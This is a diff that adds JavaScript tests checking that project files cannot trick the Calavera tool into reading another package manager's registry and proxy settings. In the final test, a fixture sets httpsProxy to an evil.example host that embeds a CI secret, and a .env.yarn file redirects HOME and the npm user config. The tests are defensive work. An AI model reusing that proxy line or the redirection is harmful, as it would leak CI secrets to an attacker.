@@ -34,6 +34,8 @@ async function fixture({ files = {}, env = {}, userAgent }) {
   return {
     cwd,
     scope: SCOPE,
+    // The home folder stands in for the operating system account's, so its files are the user's own.
+    accountHome: home,
     env: {
       HOME: home,
       ...(userAgent ? { npm_config_user_agent: userAgent } : {}),
@@ -1101,4 +1103,132 @@ test("under Bun, npm_config_@scope:registry still sets the artifact scope's regi
     source: "environment",
     setting: `${SCOPE}:registry`,
   });
+});
+
+// #1186: repository content cannot change which package manager's settings Calavera reads. npm
+// exports a project .npmrc `user-agent`, and pnpm its `userAgent` setting from
+// pnpm-workspace.yaml, as npm_config_user_agent, but both set npm_execpath to their own binary.
+// The environments below are the shapes probed with npm 11.20, pnpm 12.9, Yarn 4.18, and Bun 1.3.9.
+const NPM_EXECPATH = "/usr/local/lib/node_modules/npm/bin/npm-cli.js";
+const PNPM_EXECPATH =
+  "/Users/probe/Library/pnpm/.tools/pnpm/12.9.1/node_modules/@pnpm/exe.darwin-arm64/pnpm";
+
+test("detectLauncher trusts npm_execpath over a user agent that npm or pnpm exported from a project file", () => {
+  /** @type {[Record<string, string>, string][]} */
+  const cases = [
+    [{ npm_execpath: NPM_EXECPATH, npm_config_user_agent: YARN }, "npm"],
+    [{ npm_execpath: NPM_EXECPATH, npm_config_user_agent: BUN }, "npm"],
+    [
+      {
+        npm_execpath: "C:\\Program Files\\nodejs\\node_modules\\npm\\bin\\npm-cli.js",
+        npm_config_user_agent: BUN,
+      },
+      "npm",
+    ],
+    [{ npm_execpath: PNPM_EXECPATH, npm_config_user_agent: BUN }, "npm"],
+    [
+      {
+        npm_execpath: "/usr/local/lib/node_modules/pnpm/bin/pnpm.cjs",
+        npm_config_user_agent: YARN,
+      },
+      "npm",
+    ],
+    [
+      {
+        npm_execpath: "C:\\Users\\probe\\AppData\\Local\\pnpm\\pnpm.exe",
+        npm_config_user_agent: YARN,
+      },
+      "npm",
+    ],
+    // Yarn and Bun set both themselves, and repository content cannot change either.
+    [{ npm_execpath: "/private/tmp/xfs-c92579a3/yarn", npm_config_user_agent: YARN }, "yarn"],
+    [{ npm_execpath: "/Users/probe/.bun/bin/bun", npm_config_user_agent: BUN }, "bun"],
+    // Only the whole file name counts, so a wrapper whose name merely contains npm or pnpm does not.
+    [{ npm_execpath: "/opt/tools/pnpm-to-bun", npm_config_user_agent: BUN }, "bun"],
+    [{ npm_execpath: "/opt/tools/not-npm-cli.js", npm_config_user_agent: YARN }, "yarn"],
+    // Without npm_execpath, as when the variable is set by hand, the user agent still counts.
+    [{ npm_config_user_agent: YARN }, "yarn"],
+    [{ npm_config_user_agent: BUN }, "bun"],
+    [{}, "npm"],
+  ];
+  for (const [env, launcher] of cases) {
+    assert.equal(detectLauncher(env), launcher, env.npm_execpath ?? "no npm_execpath");
+  }
+});
+
+test("a project .npmrc user-agent exported by npm does not switch Calavera to the Yarn settings", async () => {
+  const context = await fixture({
+    files: {
+      "home/.npmrc": "https-proxy=http://user-proxy.example.com:8080/\n",
+      "workspace/project/.npmrc": "user-agent=yarn/4.9.1 npm/? node/x\n",
+      "workspace/project/.yarnrc.yml": "npmRegistryServer: https://yarn-mirror.example.com\n",
+    },
+  });
+  const result = await loadNpmRegistryOptions({
+    ...context,
+    env: {
+      ...context.env,
+      npm_execpath: NPM_EXECPATH,
+      npm_command: "exec",
+      npm_config_local_prefix: context.cwd,
+      npm_config_user_agent: "yarn/4.9.1 npm/? node/x",
+    },
+  });
+  assert.equal(result.options.httpsProxy, "http://user-proxy.example.com:8080/");
+  assert.equal(result.registry.origin, "https://registry.npmjs.org");
+});
+
+test("a pnpm userAgent in pnpm-workspace.yaml does not switch Calavera to the Bun settings", async () => {
+  const context = await fixture({
+    files: {
+      "home/.npmrc": "https-proxy=http://user-proxy.example.com:8080/\n",
+      "workspace/project/pnpm-workspace.yaml": "userAgent: bun/1.3.9 npm/? node/x\n",
+      "workspace/project/bunfig.toml": '[install]\nregistry = "https://bun-mirror.example.com/"\n',
+    },
+  });
+  const result = await loadNpmRegistryOptions({
+    ...context,
+    env: {
+      ...context.env,
+      npm_execpath: PNPM_EXECPATH,
+      npm_command: "exec",
+      npm_config_user_agent: "bun/1.3.9 npm/? node/x",
+    },
+  });
+  // Bun does not read .npmrc proxies, so the user proxy shows that the npm settings were read.
+  assert.equal(result.options.httpsProxy, "http://user-proxy.example.com:8080/");
+  assert.equal(result.registry.origin, "https://registry.npmjs.org");
+});
+
+test("a Yarn 4 .env.yarn cannot switch Calavera to the npm settings or choose the user .yarnrc.yml it expands", async () => {
+  const context = await fixture({
+    files: {
+      "home/.yarnrc.yml": "httpsProxy: http://user-proxy.example.com:8080\n",
+      "workspace/project/evilhome/.yarnrc.yml":
+        "httpsProxy: http://${CI_SECRET}.evil.example:8080\n",
+      "workspace/project/evil.npmrc": "registry=https://npm-mirror.example.com/\n",
+      "workspace/project/.env.yarn":
+        "npm_command=exec\nHOME=./evilhome\nnpm_config_userconfig=./evil.npmrc\n",
+    },
+  });
+  // Yarn 4.18 applies .env.yarn to the binaries it runs, then sets npm_execpath and
+  // npm_config_user_agent itself, so the user agent stays Yarn's, but HOME, npm_command, and
+  // npm_config_userconfig come from the file.
+  const result = await loadNpmRegistryOptions({
+    ...context,
+    env: {
+      HOME: join(context.cwd, "evilhome"),
+      CI_SECRET: SECRET,
+      npm_execpath: "/private/tmp/xfs-c92579a3/yarn",
+      npm_config_user_agent: YARN,
+      npm_command: "exec",
+      npm_config_userconfig: "./evil.npmrc",
+    },
+  });
+  assert.equal(result.registry.origin, "https://registry.yarnpkg.com");
+  assert.equal(result.options.proxy, undefined);
+  assert.deepEqual(result.warnings, [
+    "Ignored httpsProxy in the user .yarnrc.yml: Calavera expands variables only in your own .yarnrc.yml in your account's home folder and in environment variables, never in a file that a variable or a project file names.",
+  ]);
+  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET));
 });
